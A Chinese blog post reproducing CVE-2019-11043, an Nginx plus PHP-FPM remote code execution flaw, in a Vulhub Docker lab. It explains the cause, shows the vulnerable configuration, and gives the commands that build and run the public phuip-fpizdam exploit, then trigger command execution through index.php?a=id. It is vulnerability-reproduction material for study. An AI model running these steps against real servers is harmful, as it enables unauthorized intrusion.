---
title:  PHP-FPM在Nginx特定配置下远程代码执行漏洞复现
date: 2019-10-23 22:03:23
author: dylan
top: false
cover: false
password: 
categories: web安全
tags: 
    - PHP
    - Nginx
    - RCE
    - 漏洞复现
    - CVE-2019-11043
---

# 0x01 漏洞概述

在9 月 14 日至 18 举办的 Real World CTF 中，国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，
向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。

Nginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \n 导致 PATH_INFO 为空。
而 php-fpm 在处理 PATH_INFO 为空的情况下，存在逻辑缺陷。
攻击者通过精心的构造和利用，可以导致远程代码执行。

漏洞编号：CVE-2019-11043

漏洞 PoC 在 10 月 22 日公开。

# 0x02 影响范围

**PHP 5.6-7.x**

Nginx + php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。

```
 location ~ [^/]\.php(/|$) {

        fastcgi_split_path_info ^(.+?\.php)(/.*)$;

        fastcgi_param PATH_INFO       $fastcgi_path_info;

        fastcgi_pass   php:9000;

        ...
  }
}
```

# 0x03 漏洞复现

## 复现环境

攻击机：Windows 10
靶    机:  Vulhub靶场

[Vulhub](https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043)已有相关漏洞靶场，按教程搭建即可。

```
mkdir CVE-2019-11043
cd CVE-2019-11043/
wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/default.conf
wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/docker-compose.yml
mkdir www
cd www/
wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/www/index.php
cd ../
service docker start
docker-compose up -d
```

搭建好之后，访问 `http://ip:8080/index.php` 即可。

在[Github](https://github.com/neex/phuip-fpizdam)下载相应的工具
(需要安装Git，或者直接下载)
生成`phuip-fpizdam`工具
（需要安装go环境）
```
git clone https://github.com/neex/phuip-fpizdam.git
cd phuip-fpizdam
go build
```

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191023223540.png)

## 漏洞利用
在生成工具的文件夹 执行命令

`phuip-fpizdam.exe http://ip:8080/index.php`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191023223937.png)

然后访问

`http://your-ip:8080/index.php?a=id`

**注意，因为php-fpm会启动多个子进程，在访问/index.php?a=id时需要多访问几次，以访问到被污染的进程。**

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191023224120.png)

# 参考文章

[phuip-fpizdam: Exploit for CVE-2019-11043](https://github.com/neex/phuip-fpizdam)
[PHP :: Sec Bug #78599 :: env_path_info underflow in fpm_main.c can lead to RCE](https://bugs.php.net/bug.php?id=78599)
[[漏洞复现]CVE-2019-11043/PHP-FPM在Nginx特定配置下远程代码执行 - Qiita](https://qiita.com/shimizukawasaki/items/39d68a7c658dfa50263d?from=timeline&isappinstalled=0)